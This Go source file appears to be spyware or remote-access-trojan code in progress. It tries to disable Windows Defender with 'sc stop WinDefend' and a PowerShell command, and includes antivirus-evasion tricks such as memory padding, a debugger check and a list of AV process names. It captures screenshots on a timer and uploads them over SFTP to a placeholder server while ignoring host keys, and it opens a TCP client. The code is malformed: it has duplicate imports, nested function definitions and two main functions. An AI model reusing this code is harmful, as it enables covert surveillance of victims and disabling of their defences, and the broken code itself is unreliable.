package main

import (
	"github.com/vova616/screenshot"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"fmt"
	"strings"
	"log"
	"bytes"
	"image/png"
	"fmt"
	"time"
)

var connection net.Conn

func sendMessage() {
	for {
		fmt.Print(">> ")
		reader := bufio.NewReader(os.Stdin)
		textInput, _ := reader.ReadString('\n')
		textInput = strings.Replace(textInput, "\r", "", -1)
		textInput = strings.Replace(textInput, "\n", "", -1)
		if len(textInput) != 0 {
			connection.Write([]byte(textInput))
		}
	}
}

func defender() {
	c := exec.Command("sc stop WinDefend") // Tries to stop defender by using simple CMD command.

    if err := c.Run(); err != nil { 
        c := exec.Command("powershell -command Set-MpPreference -DisableRealtimeMonitoring $true") // tries the same trick but using powershell
    }   
}


// Thank EgeBalci for this one x)
func BypassAv() {
	
	var MagicNumber int64 = 0;  
	
	
	func BypassAV(Rate int) {
	  if Rate == 1 {
		AllocateFakeMemory()
	  }else if Rate == 2 {
		AllocateFakeMemory()
		Jump()
	  }else if Rate == 3 {
		AllocateFakeMemory()
		Jump()
		ProcessRecon()
	  }else{
	
	  }
	}
	
	
	func Jump() {
	  MagicNumber++
	  hop1()
	}
	
	func AllocateFakeMemory()  {
	  for i := 0; i < 1000; i++ {
		var Size int = 30000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [102400000]byte
		Buffer_2[0] = 0
	  }
	}
	
	func CheckDebugger() {
	  Flag,_,_ := IsDebuggerPresent.Call()
	  if Flag != 0 {
		//Debugger Active !!
		CheckDebugger()
	  }
	}
	
	
	func ProcessRecon() {
		
	  /* AVG
		avgidsagenta.exe
		avgcsrva.exe
		avgwdsvca.exe
		avgnsa.exe
		avgemca.exe
		avgrsa.exe
	  */
	
	  /* ESET
		egui.exe
	  */
	
	  /* KASPERSKY
		avpui.exe
	  */
	
	
	  /* NORTON
		NS.exe
	  */
	
	
	}
	
	
	func hop1() {
	  MagicNumber++
	  hop2()
	}
	func hop2() {
	  MagicNumber++
	  hop3()
	}
	func hop3() {
	  MagicNumber++
	  hop4()
	}
	func hop4() {
	  MagicNumber++
	  hop5()
	}
	func hop5() {
	  MagicNumber++
	  hop6()
	}
	func hop6() {
	  MagicNumber++
	  hop7()
	}
	func hop7() {
	  MagicNumber++
	  hop8()
	}
	func hop8() {
	  MagicNumber++
	  hop9()
	}
	func hop9() {
	  MagicNumber++
	  hop10()
	}
	func hop10() {
	  MagicNumber++
	}
}

	// send screenshot every 20 seconds using SFTP
	func uploadscreenshot(imagestr []byte) { 
		var (
		err  error
		sftpClient *sftp.Client
		)
		sftpClient, err = connect("Username", "Passwd", "IP/DNS", 1337)
		if err != nil {
		log.Fatal(err)
		}
		defer sftpClient.Close()
	   
		   // walk a directory
		   w := sftpClient.Walk("/var")
		   for w.Step() {
			   if w.Err() != nil {
				   continue
			   }
		   }
	   
	   
		   fileloc := fmt.Sprintf("/var/img/%s.png",time.Now().Format(time.RFC850))
		   fmt.Println(fileloc)
		   f, err := sftpClient.Create(fileloc)
		   if err != nil {
			   log.Fatal(err)
		   }
		   if _, err := f.Write([]byte(imagestr)); err != nil {
			   log.Fatal(err)
		   }
	   }
	   
	   func connect(user, password, host string, port int) (*sftp.Client, error) { 
		var (
		auth   []ssh.AuthMethod
		addr   string
		clientConfig *ssh.ClientConfig
		sshClient *ssh.Client
		sftpClient *sftp.Client
		err   error
		)
		// get auth
		auth = make([]ssh.AuthMethod, 0)
		auth = append(auth, ssh.Password(password))
	   
		clientConfig = &ssh.ClientConfig{
		User: user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: auth,
		Timeout: 30 * time.Second,
		}
	   
		addr = fmt.Sprintf("%s:%d", host, port)
	   
		if sshClient, err = ssh.Dial("tcp", addr, clientConfig); err != nil {
		return nil, err
		}
		if sftpClient, err = sftp.NewClient(sshClient); err != nil {
		return nil, err
		}
	   
		return sftpClient, nil
	   }
	   
		func main() {
			takescreenshot()
		   for t := range time.NewTicker(120 * time.Second).C {
			   _ = t
			   takescreenshot()
		   }
		}
	   
		func takescreenshot() {
		   img, err := screenshot.CaptureScreen()
				   if err != nil {
				 
			   }
		   buf := new(bytes.Buffer)
		   png.Encode(buf,img)
		   uploadscreenshot(buf.Bytes())
		}
}

func main() {

	conn, err := net.Dial("tcp", ":500")
	if err != nil {
		fmt.Println(err)
	}
	connection = conn
	go sendMessage()

	for {
		buf := make([]byte, 1024)
		size, err := conn.Read(buf)
		if err != nil {
			fmt.Println(err)
		}
		data := string(buf[:size])
		fmt.Println("Received From Server: " + data)

		/*
			reader := bufio.NewReader(os.Stdin)
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(conn, text+"\n")
			conn.Write([]byte(text))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Print("->: " + message)
			if strings.TrimSpace(string(text)) == "STOP" {
				fmt.Println("TCP client exiting...")
				return
			}
		*/
	}
}
